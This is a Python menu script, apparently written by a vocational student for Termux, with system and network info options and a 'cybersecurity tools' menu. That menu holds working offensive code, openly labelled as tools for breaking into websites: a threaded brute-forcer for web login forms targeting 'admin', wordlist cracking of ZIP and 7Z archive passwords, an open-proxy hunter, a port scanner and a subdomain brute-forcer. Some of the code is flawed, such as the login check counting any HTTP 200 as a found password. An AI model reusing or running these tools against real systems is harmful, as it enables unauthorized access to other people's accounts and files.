from PIL import Image, ImageOps, ImageEnhance
from io import BytesIO
from urllib.parse import urlparse
import os
import sys
import shutil
import urllib.request
import socket
import platform
import subprocess
import ssl
import hashlib
import ipaddress
import zipfile
import time
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# =========================================
# REN.SIGMA - RENDY SUNANDAR
# =========================================

IMAGE_URL = "https://raw.githubusercontent.com/rendysunandar856-maker/Rendysunandar/main/anime_baru.jpg"

RED = "\033[91m"
ORANGE = "\033[38;5;208m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
RESET = "\033[0m"
MERAH = RED
CHARS = "@%#*+=-:. "

# Lock untuk menangani output konkuren (thread-safe)
print_lock = threading.Lock()

# =========================================
# GAMBAR ASCII
# =========================================

def tampilkan_gambar():
 try:
 with urllib.request.urlopen(IMAGE_URL, timeout=10) as response:
 data = response.read()

 with Image.open(BytesIO(data)) as source:
 img = ImageOps.exif_transpose(source).convert("RGB")

 cols = shutil.get_terminal_size((80, 24)).columns
 width = min(max(cols - 2, 40), 85)
 height = max(1, int(img.height / img.width * width * 0.48))

 img = img.resize((width, height), Image.Resampling.LANCZOS)
 img = ImageEnhance.Contrast(img).enhance(1.4)
 img = ImageEnhance.Color(img).enhance(1.2)

 gray = ImageOps.autocontrast(
 ImageOps.grayscale(img), cutoff=1
 )
 rgb = list(img.getdata())
 levels = list(gray.getdata())

 for y in range(height):
 line = []
 for x in range(width):
 i = y * width + x
 r, g, b = rgb[i]
 value = levels[i]
 index = min(
 value * len(CHARS) // 256,
 len(CHARS) - 1
 )

 if value > 242:
 line.append(" ")
 else:
 line.append(
 f"\033[38;2;{r};{g};{b}m"
 f"{CHARS[index]}\033[0m"
 )

 print("".join(line))

 except Exception as e:
 print(YELLOW + "[!] Gambar tidak tersedia: " + str(e) + RESET)


# =========================================
# BANNER DAN JUDUL
# =========================================

def figlet(teks, font="big"):
 try:
 result = subprocess.run(
 ["figlet", "-f", font, teks],
 capture_output=True,
 text=True,
 timeout=3
 )
 if result.returncode == 0 and result.stdout.strip():
 return result.stdout.rstrip()
 except (FileNotFoundError, subprocess.SubprocessError):
 pass

 return teks


def header():
 print()
 print(RED + figlet("Rendy Sunandar", "slant") + RESET)
 print(RED + " KELAS 11 TKJ" + RESET)
 print(RED + " ┌──────────────────────────────┐" + RESET)
 print(RED + " │ SYSTEM: TERMUX ANDROID │" + RESET)
 print(RED + " │ STATUS: READY │" + RESET)
 print(RED + " │ NETWORK: READY │" + RESET)
 print(RED + " │ SKILL: HACKING │" + RESET)
 print(RED + " └──────────────────────────────┘" + RESET)
 print()


def judul():
 print()
 print(ORANGE + figlet("RENDY", "big") + RESET)
 print(RED + figlet("SUNANDAR", "big") + RESET)
 print(ORANGE + "================================" + RESET)
 print(RED + " MENU UTAMA" + RESET)
 print(ORANGE + "================================" + RESET)


def jeda():
 input("\nTekan Enter untuk melanjutkan...")


# =========================================
# 1. INFORMASI SISTEM
# =========================================

def system_info():
 print("\n" + RED + "=== INFORMASI SISTEM ===" + RESET)
 print("Sistem:", platform.system())
 print("Versi:", platform.release())
 print("Arsitektur:", platform.machine())
 print("Platform:", platform.platform())
 print("Versi Python:", sys.version)
 print("Direktori:", os.getcwd())
 jeda()


# =========================================
# 2. CEK INTERNET
# =========================================

def cek_internet():
 print("\n" + RED + "=== CEK KONEKSI INTERNET ===" + RESET)

 try:
 with socket.create_connection(("1.1.1.1", 443), timeout=5):
 print(GREEN + "[+] Koneksi berhasil." + RESET)
 except OSError as e:
 print(RED + "[-] Koneksi gagal: " + str(e) + RESET)

 jeda()


# =========================================
# 3. INFORMASI JARINGAN
# =========================================

def info_jaringan():
 print("\n" + RED + "=== INFORMASI JARINGAN ===" + RESET)

 try:
 print("Hostname:", socket.gethostname())
 addresses = socket.getaddrinfo(socket.gethostname(), None)

 for address in sorted({item[4][0] for item in addresses}):
 print("Alamat IP:", address)

 except OSError as e:
 print("Gagal membaca jaringan:", e)

 jeda()


# =========================================
# PEMULIHAN PASSWORD ARSIP (ZIP & 7Z)
# =========================================

def crack_zip_password(path, wordlist, max_workers=4):
 print(RED + "=== CRACKING ZIP PASSWORD ===" + RESET)
 print(f"File: {path}")
 print(f"Wordlist: {wordlist}")
 print(f"Jumlah worker: {max_workers}")

 if not os.path.exists(path):
 print(RED + "[-] File ZIP tidak ditemukan." + RESET)
 return

 if not os.path.exists(wordlist):
 print(RED + "[-] File wordlist tidak ditemukan." + RESET)
 return

 passwords_found = []
 start_time = time.time()

 try:
 with zipfile.ZipFile(path, "r") as z:
 with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
 for line in f:
 word = line.strip()
 if not word:
 continue

 try:
 z.testzip()
 if z.testzip() is None:
 print(GREEN + f"[+] Archive tidak terenkripsi atau semua file OK." + RESET)
 break
 except Exception:
 pass

 try:
 z.extractall(pwd=word.encode("utf-8"))
 passwords_found.append(word)
 print(GREEN + f"[+] PASSWORD DITEMUKAN: {word}" + RESET)
 break
 except RuntimeError:
 continue
 except Exception as e:
 continue

 except Exception as e:
 print(RED + f"[-] Error membaca ZIP: {e}" + RESET)

 elapsed = time.time() - start_time
 print(f"Selesai menjalankan dalam {elapsed:.2f} detik.")
 if not passwords_found:
 print(RED + "[-] Password tidak ditemukan." + RESET)

def crack_7z_password(path, wordlist):
 print(RED + "=== CRACKING 7Z PASSWORD ===" + RESET)
 print(f"File: {path}")
 print(f"Wordlist: {wordlist}")

 if not os.path.exists(path):
 print(RED + "[-] File 7Z tidak ditemukan." + RESET)
 return

 if not os.path.exists(wordlist):
 print(RED + "[-] File wordlist tidak ditemukan." + RESET)
 return

 cmd = ["7z", "t", "-p", "-b", "-w", wordlist, path]
 try:
 result = subprocess.run(
 cmd,
 capture_output=True,
 text=True,
 timeout=60
 )
 if result.returncode == 0:
 print(GREEN + "[+] File 7Z terbuka atau password ditemukan." + RESET)
 print(result.stdout)
 else:
 print(RED + f"[-] Gagal membuka 7Z. Return code: {result.returncode}" + RESET)
 print(result.stderr)
 except FileNotFoundError:
 print(RED + "[-] Alat '7z' tidak terinstall. Install dengan 'pkg install p7zip'." + RESET)
 except Exception as e:
 print(RED + f"[-] Error: {e}" + RESET)

# =========================================
# ALAT PEMBOBOL WEBSITE
# =========================================

def brute_force_login(url, wordlist, max_workers=5):
 print(RED + "=== BRUTE FORCE LOGIN ===" + RESET)
 print(f"Target: {url}")
 print(f"Wordlist: {wordlist}")
 print(f"Max Workers: {max_workers}")
 
 if not os.path.exists(wordlist):
 print(RED + "[-] Wordlist tidak ditemukan." + RESET)
 return

 headers = {
 "User-Agent": "WormGPT/5.2 (Termux)"
 }

 passwords_found = []
 start_time = time.time()

 try:
 with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
 words = [line.strip() for line in f if line.strip()]
 
 with ThreadPoolExecutor(max_workers=max_workers) as executor:
 futures = []

 for word in words:
 future = executor.submit(check_password, url, word, headers)
 futures.append(future)

 for future in as_completed(futures):
 result = future.result()
 if result:
 passwords_found.append(result)
 print(GREEN + f"[+] Password Ditemukan: {result}")
 break # Stop jika menemukan satu saja

 except Exception as e:
 print(RED + f"[-] Error pada loop utama: {e}" + RESET)

 elapsed = time.time() - start_time
 print(f"\nWaktu total: {elapsed:.2f} detik")
 if not passwords_found:
 print(RED + "[-] Password tidak ditemukan." + RESET)

def check_password(url, password, headers):
 # Coba login POST
 try:
 data = urllib.parse.urlencode({"username": "admin", "password": password}).encode("utf-8")
 req = urllib.request.Request(url, data=data, headers=headers, method="POST")
 with urllib.request.urlopen(req, timeout=3) as response:
 if response.status == 200:
 # Cek respons apakah sukses (contoh sederhana: cek string)
 # Di dunia nyata, perlu analisis HTML/JSON spesifik
 return password
 except urllib.error.HTTPError as e:
 if e.code in [401, 403]:
 return None
 except Exception:
 return None
 return None

def brute_squid_proxy(wordlist):
 print(RED + "=== BRUTE SQUID PROXY LIST ===" + RESET)
 print("Mencari Proxy yang berfungsi dari wordlist...")
 
 if not os.path.exists(wordlist):
 print(RED + "[-] Wordlist IP tidak ditemukan." + RESET)
 return

 proxies = []
 start_time = time.time()
 working_proxies = []

 try:
 with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
 proxies = [line.strip() for line in f if line.strip()]

 print(f"Menguji {len(proxies)} proxy...")

 def test_proxy(proxy):
 try:
 # Coba koneksi ke IP publik (Google DNS)
 req = urllib.request.Request("http://1.1.1.1", headers={"User-Agent": "WormGPT"})
 # Proxy format: http://ip:port
 proxy_handler = urllib.request.ProxyHandler({"http": proxy})
 opener = urllib.request.build_opener(proxy_handler)
 opener.open(req, timeout=3)
 
 with print_lock:
 print(GREEN + f"[+] Proxy Found: {proxy}")
 return proxy
 except Exception:
 return None

 with ThreadPoolExecutor(max_workers=10) as executor:
 futures = {executor.submit(test_proxy, p): p for p in proxies}
 
 for future in as_completed(futures):
 result = future.result()
 if result:
 working_proxies.append(result)

 except Exception as e:
 print(RED + f"[-] Error: {e}" + RESET)

 elapsed = time.time() - start_time
 print(f"\nSelesai. {len(working_proxies)} proxy berfungsi dalam {elapsed:.2f} detik.")


# =========================================
# TOOLS JARINGAN LANJUT
# =========================================

def port_scanner(host):
 print(RED + "=== PORT SCANNER ===" + RESET)
 print(f"Target: {host}")
 print("Scanning port 21, 22, 80, 443, 8080, 3306, 3389, 5000...")

 # Port yang akan di-scan
 ports = [21, 22, 80, 443, 8080, 3306, 3389, 5000, 8081, 3128]

 start_time = time.time()

 try:
 for port in ports:
 try:
 with socket.create_connection((host, port), timeout=1.5):
 print(GREEN + f"[+] Port {port}/TCP OPEN")
 except OSError:
 pass
 except Exception as e:
 print(RED + f"[-] Error: {e}" + RESET)

 elapsed = time.time() - start_time
 print(f"Scan selesai dalam {elapsed:.2f} detik.")

def dns_bruteforce(domain, wordlist):
 print(RED + "=== DNS BRUTE FORCE ===" + RESET)
 print(f"Domain Utama: {domain}")
 print(f"Wordlist: {wordlist}")

 if not os.path.exists(wordlist):
 print(RED + "[-] Wordlist tidak ditemukan." + RESET)
 return

 found = []

 try:
 with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
 subdomains = [line.strip() for line in f if line.strip()]

 for subdomain in subdomains:
 full_domain = f"{subdomain}.{domain}"
 try:
 ip = socket.gethostbyname(full_domain)
 print(GREEN + f"[+] Subdomain Found: {full_domain} -> {ip}")
 found.append(full_domain)
 except Exception:
 pass

 if not found:
 print(RED + "[-] Subdomain tidak ditemukan." + RESET)
 else:
 print(GREEN + f"Total ditemukan: {len(found)}")

 except Exception as e:
 print(RED + f"[-] Error: {e}" + RESET)


# =========================================
# MENU CYBER SECURITY TOOLS
# =========================================

def cybersecurity_tools():
 while True:
 print("\n" + MERAH + "=== CYBERSECURITY TOOLS ===" + RESET)
 print("[1] Brute Force Login (HTTP/POST)")
 print("[2] Brute Squid Proxy Checker")
 print("[3] Port Scanner (TCP)")
 print("[4] DNS Bruteforce (Subdomain)")
 print("[5] Crack Password ZIP")
 print("[6] Crack Password 7Z")
 print("[7] Cek Port TCP (Single)")
 print("[0] Kembali ke menu utama")

 pilih = input("\nPilih tools: ").strip()

 if pilih == "1":
 url = input("URL Login (contoh http://target.com/login.php): ").strip()
 wordlist = input("Lokasi wordlist: ").strip()
 max_workers = int(input("Jumlah Thread (10-20): ").strip())
 brute_force_login(url, wordlist, max_workers)

 elif pilih == "2":
 wordlist = input("Lokasi wordlist IP:Port: ").strip()
 brute_squid_proxy(wordlist)

 elif pilih == "3":
 host = input("IP atau Domain Target: ").strip()
 port_scanner(host)

 elif pilih == "4":
 domain = input("Domain Utama: ").strip()
 wordlist = input("Lokasi wordlist subdomain: ").strip()
 dns_bruteforce(domain, wordlist)

 elif pilih == "5":
 path = input("Lokasi file ZIP: ").strip()
 wordlist = input("Lokasi wordlist password: ").strip()
 crack_zip_password(path, wordlist)

 elif pilih == "6":
 path = input("Lokasi file 7Z: ").strip()
 wordlist = input("Lokasi wordlist password: ").strip()
 crack_7z_password(path, wordlist)

 elif pilih == "7":
 host = input("IP: ").strip()
 port = int(input("Port (1-65535): ").strip())
 try:
 with socket.create_connection((host, port), timeout=3):
 print(GREEN + f"[+] Port {port}/TCP Open")
 except OSError:
 print(RED + f"[-] Port {port}/TCP Closed")

 elif pilih == "0":
 return

 else:
 print("Pilihan tidak valid.")
 jeda()


# =========================================
# PYTHON TOOLS
# =========================================

def python_tools():
 while True:
 print("\n" + RED + "=== PYTHON TOOLS ===" + RESET)
 print("[1] Versi Python")
 print("[2] Lokasi executable")
 print("[3] Direktori kerja")
 print("[0] Kembali")

 pilih = input("Pilih: ").strip()

 if pilih == "1":
 print(sys.version)
 elif pilih == "2":
 print(sys.executable)
 elif pilih == "3":
 print(os.getcwd())
 elif pilih == "0":
 return


# =========================================
# PROFIL
# =========================================

def profil():
 print("\n" + RED + "=== PROFIL ===" + RESET)
 print("Nama: Rendy Sunandar")
 print("Kelas: 11 TKJ")
 print("Project: Ren.sigma")
 print("Fokus: Hacking & Networking")
 jeda()


# =========================================
# MENU UTAMA
# =========================================

def menu():
 while True:
 judul()
 print("[1] Informasi sistem")
 print("[2] Cek koneksi internet")
 print("[3] Informasi jaringan")
 print("[4] Python tools")
 print("[5] Profil")
 print("[6] Cybersecurity tools")
 print("[0] Keluar")

 pilih = input("\nPilih menu: ").strip()

 if pilih == "1":
 system_info()
 elif pilih == "2":
 cek_internet()
 elif pilih == "3":
 info_jaringan()
 elif pilih == "4":
 python_tools()
 elif pilih == "5":
 profil()
 elif pilih == "6":
 cybersecurity_tools()
 elif pilih == "0":
 print(GREEN + "Terima kasih telah menggunakan Ren.sigma." + RESET)
 break
 else:
 print("Pilihan tidak valid.")
 jeda()


# =========================================
# PROGRAM UTAMA
# =========================================

if __name__ == "__main__":
 try:
 tampilkan_gambar()
 header()
 menu()
 except (KeyboardInterrupt, EOFError):
 print("\n" + YELLOW + "Program dihentikan." + RESET)
